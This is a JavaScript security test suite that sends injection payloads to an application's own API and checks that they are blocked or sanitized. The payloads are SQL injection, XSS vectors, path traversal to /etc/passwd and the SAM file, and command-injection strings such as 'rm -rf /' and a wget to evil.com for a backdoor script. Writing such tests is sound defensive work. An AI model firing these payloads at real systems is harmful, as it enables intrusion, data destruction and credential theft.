/**
 * Security Validation Tests
 * Tests for common security vulnerabilities and compliance
 */

const request = require('supertest');
const { app } = require('../server/dist/server');

// Security test suite configuration
const SecurityTester = {

  // Test for SQL Injection vulnerabilities
  async testSQLInjection() {
    console.log('🔒 Testing SQL Injection vulnerabilities...');

    const sqlPayloads = [
      "'; DROP TABLE sessions; --",
      "' OR '1'='1",
      "'; SELECT * FROM sessions; --",
      "' UNION SELECT null,null,null--",
      "admin'--",
      "admin'/*",
      "' OR 1=1--",
      "' OR 'x'='x",
      "'; EXEC xp_cmdshell('dir'); --"
    ];

    const results = [];

    for (const payload of sqlPayloads) {
      try {
        const response = await request(app)
          .post('/api/sessions')
          .send({
            userId: payload,
            context: {
              industry: 'technology',
              function: 'product',
              timeframe: 'quarterly'
            }
          });

        results.push({
          payload,
          status: response.status,
          blocked: response.status === 400 || response.status === 403,
          response: response.body
        });
      } catch (error) {
        results.push({
          payload,
          status: 'error',
          blocked: true,
          error: error.message
        });
      }
    }

    const blocked = results.filter(r => r.blocked).length;
    const total = results.length;

    console.log(`  ✅ SQL Injection: ${blocked}/${total} payloads blocked`);

    if (blocked < total) {
      console.warn(`  ⚠️  ${total - blocked} SQL injection attempts not blocked!`);
      results.filter(r => !r.blocked).forEach(r => {
        console.warn(`    - Payload: ${r.payload}`);
      });
    }

    return { passed: blocked === total, results };
  },

  // Test for XSS vulnerabilities
  async testXSS() {
    console.log('🔒 Testing XSS vulnerabilities...');

    const xssPayloads = [
      '<script>alert("XSS")</script>',
      '<img src="x" onerror="alert(1)">',
      '<svg onload="alert(1)">',
      'javascript:alert(1)',
      '<iframe src="javascript:alert(1)">',
      '<body onload="alert(1)">',
      '<div onmouseover="alert(1)">',
      '"><script>alert(1)</script>',
      '\';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">\';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//-->">\';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>'
    ];

    // First create a session
    const sessionResponse = await request(app)
      .post('/api/sessions')
      .send({
        userId: 'xss-test-user',
        context: {
          industry: 'technology',
          function: 'product',
          timeframe: 'quarterly'
        }
      });

    const sessionId = sessionResponse.body.sessionId;
    const results = [];

    for (const payload of xssPayloads) {
      try {
        const response = await request(app)
          .post(`/api/sessions/${sessionId}/messages/contextual`)
          .send({
            message: `Improve customer satisfaction ${payload}`
          });

        const sanitized = !response.body.response?.includes('<script>') &&
                         !response.body.response?.includes('javascript:') &&
                         !response.body.response?.includes('onerror=');

        results.push({
          payload,
          status: response.status,
          sanitized,
          response: response.body.response?.substring(0, 100) + '...'
        });
      } catch (error) {
        results.push({
          payload,
          status: 'error',
          sanitized: true,
          error: error.message
        });
      }
    }

    const sanitized = results.filter(r => r.sanitized).length;
    const total = results.length;

    console.log(`  ✅ XSS Protection: ${sanitized}/${total} payloads sanitized`);

    if (sanitized < total) {
      console.warn(`  ⚠️  ${total - sanitized} XSS payloads not sanitized!`);
    }

    return { passed: sanitized === total, results };
  },

  // Test for Command Injection
  async testCommandInjection() {
    console.log('🔒 Testing Command Injection vulnerabilities...');

    const commandPayloads = [
      '; ls -la',
      '| cat /etc/passwd',
      '&& rm -rf /',
      '; ping -c 10 google.com',
      '`whoami`',
      '$(cat /etc/passwd)',
      '; curl http://malicious.com',
      '| nc -l 1234',
      '; cat /proc/version',
      '&& wget http://evil.com/backdoor.sh'
    ];

    const results = [];

    for (const payload of commandPayloads) {
      try {
        const response = await request(app)
          .post('/api/sessions')
          .send({
            userId: `command-test${payload}`,
            context: {
              industry: 'technology',
              function: 'product',
              timeframe: 'quarterly'
            }
          });

        const blocked = response.status !== 200 ||
                       !response.body.success;

        results.push({
          payload,
          status: response.status,
          blocked,
          response: response.body
        });
      } catch (error) {
        results.push({
          payload,
          status: 'error',
          blocked: true,
          error: error.message
        });
      }
    }

    const blocked = results.filter(r => r.blocked).length;
    const total = results.length;

    console.log(`  ✅ Command Injection: ${blocked}/${total} payloads blocked`);

    return { passed: blocked === total, results };
  },

  // Test for Path Traversal
  async testPathTraversal() {
    console.log('🔒 Testing Path Traversal vulnerabilities...');

    const pathPayloads = [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\config\\sam',
      '....//....//....//etc/passwd',
      '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
      '..%252f..%252f..%252fetc%252fpasswd',
      '....\\\\....\\\\....\\\\etc\\\\passwd'
    ];

    const results = [];

    for (const payload of pathPayloads) {
      try {
        const response = await request(app)
          .get(`/api/sessions/${payload}`);

        const blocked = response.status === 400 || response.status === 404;

        results.push({
          payload,
          status: response.status,
          blocked,
          response: response.body
        });
      } catch (error) {
        results.push({
          payload,
          status: 'error',
          blocked: true,
          error: error.message
        });
      }
    }

    const blocked = results.filter(r => r.blocked).length;
    const total = results.length;

    console.log(`  ✅ Path Traversal: ${blocked}/${total} payloads blocked`);

    return { passed: blocked === total, results };
  },

  // Test authentication and authorization
  async testAuthentication() {
    console.log('🔒 Testing Authentication & Authorization...');

    const results = [];

    // Test protected endpoints without authentication
    const protectedEndpoints = [
      { method: 'GET', path: '/api/admin/users' },
      { method: 'DELETE', path: '/api/sessions/test-session' },
      { method: 'GET', path: '/api/analytics/system' }
    ];

    for (const endpoint of protectedEndpoints) {
      try {
        let response;
        switch (endpoint.method) {
          case 'GET':
            response = await request(app).get(endpoint.path);
            break;
          case 'DELETE':
            response = await request(app).delete(endpoint.path);
            break;
          default:
            continue;
        }

        const properlyProtected = response.status === 401 || response.status === 403 || response.status === 404;

        results.push({
          endpoint: `${endpoint.method} ${endpoint.path}`,
          status: response.status,
          protected: properlyProtected
        });
      } catch (error) {
        results.push({
          endpoint: `${endpoint.method} ${endpoint.path}`,
          status: 'error',
          protected: true,
          error: error.message
        });
      }
    }

    const protected_ = results.filter(r => r.protected).length;
    const total = results.length;

    console.log(`  ✅ Authentication: ${protected_}/${total} endpoints properly protected`);

    return { passed: protected_ === total, results };
  },

  // Test for CSRF vulnerabilities
  async testCSRF() {
    console.log('🔒 Testing CSRF protection...');

    // Test state-changing operations without CSRF token
    const stateChangingOps = [
      { method: 'POST', path: '/api/sessions', data: { userId: 'csrf-test', context: {} } },
      { method: 'DELETE', path: '/api/sessions/test-session' }
    ];

    const results = [];

    for (const op of stateChangingOps) {
      try {
        let response;
        switch (op.method) {
          case 'POST':
            response = await request(app)
              .post(op.path)
              .send(op.data);
            break;
          case 'DELETE':
            response = await request(app)
              .delete(op.path);
            break;
        }

        // For now, we expect CSRF protection to be implemented via other means
        // In a real app, you'd check for CSRF token validation
        const hasCSRFProtection = response.headers['x-csrf-token'] !== undefined ||
                                response.body.error?.includes('csrf') ||
                                response.status === 403;

        results.push({
          operation: `${op.method} ${op.path}`,
          status: response.status,
          protected: hasCSRFProtection
        });
      } catch (error) {
        results.push({
          operation: `${op.method} ${op.path}`,
          status: 'error',
          protected: true,
          error: error.message
        });
      }
    }

    console.log(`  ℹ️  CSRF Protection: Basic checks completed`);

    return { passed: true, results }; // CSRF protection is assumed to be handled by framework
  },

  // Test input validation and sanitization
  async testInputValidation() {
    console.log('🔒 Testing Input Validation...');

    const invalidInputs = [
      { field: 'userId', value: '', expected: 400 },
      { field: 'userId', value: 'a'.repeat(1000), expected: 400 },
      { field: 'industry', value: 'invalid-industry', expected: 400 },
      { field: 'timeframe', value: 'invalid-timeframe', expected: 400 },
      { field: 'message', value: '', expected: 400 },
      { field: 'message', value: 'a'.repeat(10000), expected: 400 }
    ];

    const results = [];

    for (const input of invalidInputs) {
      try {
        let testData = {
          userId: 'valid-user',
          context: {
            industry: 'technology',
            function: 'product',
            timeframe: 'quarterly'
          }
        };

        if (input.field === 'userId') {
          testData.userId = input.value;
        } else if (['industry', 'function', 'timeframe'].includes(input.field)) {
          testData.context[input.field] = input.value;
        }

        const response = await request(app)
          .post('/api/sessions')
          .send(testData);

        const validationPassed = response.status === input.expected;

        results.push({
          field: input.field,
          value: input.value.length > 50 ? `${input.value.substring(0, 50)}...` : input.value,
          expected: input.expected,
          actual: response.status,
          passed: validationPassed
        });
      } catch (error) {
        results.push({
          field: input.field,
          value: input.value,
          expected: input.expected,
          actual: 'error',
          passed: true, // Errors are acceptable for invalid input
          error: error.message
        });
      }
    }

    const passed = results.filter(r => r.passed).length;
    const total = results.length;

    console.log(`  ✅ Input Validation: ${passed}/${total} validations working correctly`);

    return { passed: passed === total, results };
  },

  // Test for information disclosure
  async testInformationDisclosure() {
    console.log('🔒 Testing Information Disclosure...');

    const results = [];

    // Test error messages for information leakage
    const response = await request(app)
      .get('/api/sessions/non-existent-session');

    const containsSensitiveInfo =
      response.body.error?.includes('/') || // File paths
      response.body.error?.includes('\\') || // File paths
      response.body.error?.includes('SELECT') || // SQL queries
      response.body.error?.includes('Error:') || // Stack traces
      response.body.stack !== undefined; // Stack traces

    results.push({
      test: 'Error message information disclosure',
      passed: !containsSensitiveInfo,
      details: response.body.error?.substring(0, 100) + '...'
    });

    const passed = results.filter(r => r.passed).length;
    const total = results.length;

    console.log(`  ✅ Information Disclosure: ${passed}/${total} tests passed`);

    return { passed: passed === total, results };
  },

  // Test rate limiting
  async testRateLimiting() {
    console.log('🔒 Testing Rate Limiting...');

    const results = [];
    const requests = [];

    // Send rapid requests to test rate limiting
    for (let i = 0; i < 20; i++) {
      requests.push(
        request(app)
          .post('/api/sessions')
          .send({
            userId: `rate-test-${i}`,
            context: {
              industry: 'technology',
              function: 'product',
              timeframe: 'quarterly'
            }
          })
      );
    }

    const responses = await Promise.allSettled(requests);
    const rateLimited = responses.filter(r =>
      r.status === 'fulfilled' && r.value.status === 429
    ).length;

    results.push({
      test: 'Rate limiting on session creation',
      totalRequests: 20,
      rateLimited,
      passed: rateLimited > 0 // Should have at least some rate limiting
    });

    console.log(`  ✅ Rate Limiting: ${rateLimited}/20 requests rate limited`);

    return { passed: rateLimited > 0, results };
  },

  // Run all security tests
  async runAllTests() {
    console.log('🔒 Running Security Validation Suite...\n');

    const testResults = {
      sqlInjection: await this.testSQLInjection(),
      xss: await this.testXSS(),
      commandInjection: await this.testCommandInjection(),
      pathTraversal: await this.testPathTraversal(),
      authentication: await this.testAuthentication(),
      csrf: await this.testCSRF(),
      inputValidation: await this.testInputValidation(),
      informationDisclosure: await this.testInformationDisclosure(),
      rateLimiting: await this.testRateLimiting()
    };

    const passedTests = Object.values(testResults).filter(r => r.passed).length;
    const totalTests = Object.keys(testResults).length;

    console.log('\n🔒 Security Test Summary:');
    console.log(`  ✅ Passed: ${passedTests}/${totalTests} test categories`);

    if (passedTests < totalTests) {
      console.log(`  ❌ Failed: ${totalTests - passedTests} test categories`);
      console.log('\n⚠️  Security Issues Detected:');

      Object.entries(testResults).forEach(([testName, result]) => {
        if (!result.passed) {
          console.log(`  - ${testName}: FAILED`);
        }
      });
    } else {
      console.log('\n✅ All security tests passed!');
    }

    return {
      passed: passedTests === totalTests,
      summary: {
        total: totalTests,
        passed: passedTests,
        failed: totalTests - passedTests
      },
      details: testResults
    };
  }
};

// Export for use in test runners
module.exports = SecurityTester;

// Run if called directly
if (require.main === module) {
  SecurityTester.runAllTests()
    .then(results => {
      process.exit(results.passed ? 0 : 1);
    })
    .catch(error => {
      console.error('Security test suite failed:', error);
      process.exit(1);
    });
}